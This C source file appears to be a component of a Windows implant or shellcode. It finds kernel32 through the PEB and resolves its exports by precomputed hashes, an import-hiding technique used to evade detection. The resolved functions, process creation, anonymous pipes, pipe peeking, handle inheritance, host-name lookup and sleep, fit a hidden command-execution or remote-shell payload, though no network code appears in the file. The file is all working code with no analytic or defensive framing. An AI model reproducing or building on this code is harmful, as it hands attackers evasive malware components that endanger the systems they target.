#include "kernel32.h"
#include "system.h"
#include "wintypes.h"
#include "apihash.h"

BOOL KERNEL32_Ctor(KERNEL32 *kernel)
{
    PVOID module;

    if (kernel == NULL)
        return FALSE;

    module = GetModuleHandleFromPEB(HASH_MOD_KERNEL32);
    if (module == NULL)
        return FALSE;

    kernel->GetProcAddress = (PVOID (WINAPI *)(PVOID, const CHAR *))
        ResolveExportByHash(module, HASH_GETPROCADDRESS);
    kernel->LoadLibraryA = (PVOID (WINAPI *)(const CHAR *))
        ResolveExportByHash(module, HASH_LOADLIBRARYA);
    kernel->GetComputerNameA = (BOOL (WINAPI *)(PCHAR, DWORD *))
        ResolveExportByHash(module, HASH_GETCOMPUTERNAMEA);
    kernel->SetHandleInformation = (BOOL (WINAPI *)(HANDLE, DWORD, DWORD))
        ResolveExportByHash(module, HASH_SETHANDLEINFORMATION);
    kernel->CreateProcessW = (BOOL (WINAPI *)(const PWCHAR, const PWCHAR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, PVOID, const PWCHAR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))
        ResolveExportByHash(module, HASH_CREATEPROCESSW);
    kernel->CloseHandle = (BOOL (WINAPI *)(HANDLE))
        ResolveExportByHash(module, HASH_CLOSEHANDLE);
    kernel->TerminateProcess = (BOOL (WINAPI *)(HANDLE, UINT32))
        ResolveExportByHash(module, HASH_TERMINATEPROCESS);
    kernel->WriteFile = (BOOL (WINAPI *)(HANDLE, const void *, DWORD, DWORD *, PVOID))
        ResolveExportByHash(module, HASH_WRITEFILE);
    kernel->ReadFile = (BOOL (WINAPI *)(HANDLE, void *, DWORD, DWORD *, PVOID))
        ResolveExportByHash(module, HASH_READFILE);
    kernel->PeekNamedPipe = (BOOL (WINAPI *)(HANDLE, void *, DWORD, DWORD *, DWORD *, DWORD *))
        ResolveExportByHash(module, HASH_PEEKNAMEDPIPE);
    kernel->CreatePipe = (BOOL (WINAPI *)(HANDLE *, HANDLE *, LPSECURITY_ATTRIBUTES, DWORD))
        ResolveExportByHash(module, HASH_CREATEPIPE);
    kernel->GetStdHandle = (HANDLE (WINAPI *)(DWORD))
        ResolveExportByHash(module, HASH_GETSTDHANDLE);
    kernel->GetLastError = (DWORD (WINAPI *)(void))
        ResolveExportByHash(module, HASH_GETLASTERROR);
    kernel->Sleep = (void (WINAPI *)(DWORD))
        ResolveExportByHash(module, HASH_SLEEP);
    kernel->ExitProcess = (void (WINAPI *)(UINT32))
        ResolveExportByHash(module, HASH_EXITPROCESS);

    return (kernel->GetProcAddress != NULL &&
            kernel->LoadLibraryA != NULL &&
            kernel->GetComputerNameA != NULL &&
            kernel->SetHandleInformation != NULL &&
            kernel->CreateProcessW != NULL &&
            kernel->CloseHandle != NULL &&
            kernel->TerminateProcess != NULL &&
            kernel->WriteFile != NULL &&
            kernel->ReadFile != NULL &&
            kernel->PeekNamedPipe != NULL &&
            kernel->CreatePipe != NULL &&
            kernel->GetStdHandle != NULL &&
            kernel->GetLastError != NULL &&
            kernel->Sleep != NULL &&
            kernel->ExitProcess != NULL);
}
